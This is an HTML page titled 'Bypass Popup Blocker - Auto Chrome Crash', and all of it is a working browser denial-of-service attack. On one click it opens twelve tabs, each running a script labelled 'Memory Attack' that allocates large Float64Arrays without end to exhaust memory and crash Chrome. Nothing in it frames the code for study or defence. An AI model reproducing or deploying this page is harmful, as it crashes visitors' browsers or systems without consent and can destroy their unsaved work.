<!DOCTYPE html>
<html>
<head>
    <title>Bypass Popup Blocker - Auto Chrome Crash</title>
</head>
<body>
    <h1>Click Anywhere to Start</h1>
    <p>Once clicked, Chrome will begin opening multiple tabs.</p>

    <script>
        function startWorker() {
            let data = [];
            function allocate() {
                for (let i = 0; i < 1000; i++) { 
                    data.push(new Float64Array(2e7)); // High memory allocation
                }
                requestAnimationFrame(allocate);
            }
            allocate();
        }

        function openTabs() {
            let tabs = [];

            // Open multiple tabs in a loop
            for (let i = 0; i < 12; i++) {
                let newTab = window.open("", "_blank"); // Open empty tabs
                if (newTab) {
                    newTab.document.write(`
                        <html>
                        <head><title>Memory Attack</title></head>
                        <body>
                        <h1>Memory Attack Running...</h1>
                        <script>
                            function startWorker() {
                                let data = [];
                                function allocate() {
                                    for (let i = 0; i < 1000; i++) { 
                                        data.push(new Float64Array(2e7)); 
                                    }
                                    requestAnimationFrame(allocate);
                                }
                                allocate();
                            }
                            startWorker();
                        <\/script>
                        </body>
                        </html>
                    `);
                    newTab.document.close();
                    tabs.push(newTab);
                } else {
                    alert("Popup blocked! Please allow popups and try again.");
                    break;
                }
            }
        }

        document.body.addEventListener("click", openTabs, { once: true });
    </script>
</body>
</html>
